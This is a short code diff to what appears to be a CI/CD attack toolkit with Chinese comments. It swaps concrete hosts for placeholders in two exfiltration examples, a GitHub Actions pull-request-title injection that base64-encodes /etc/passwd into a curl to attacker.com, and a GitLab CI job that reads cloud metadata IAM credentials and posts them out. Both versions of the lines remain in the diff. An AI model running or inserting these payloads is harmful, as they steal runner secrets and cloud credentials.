@@ -30,7 +30,7 @@ def jenkins_script_console(target: str, cmd: str):
 #   - run: echo "${{ github.event.pull_request.title }}"
 
 # Attack PR Title:
-# ]); curl https://attacker.com/$(cat /etc/passwd | base64); #
+# ]); curl https://<attacker-domain>/$(cat <sensitive-file> | base64); #
 # → 注入到 shell 命令 → RCE → 读 runner 的 secrets
 
 # 更多注入点:
@@ -69,7 +69,7 @@ def probe_gha_injection(repo: str):
 #   - exploit
 # exploit:
 #   script:
-#     - curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | base64 | curl -d @- https://attacker.com/log
+#     - curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | base64 | curl -d @- https://<attacker-domain>/log
 #   tags:
 #     - docker  # 或 self-hosted runner
 
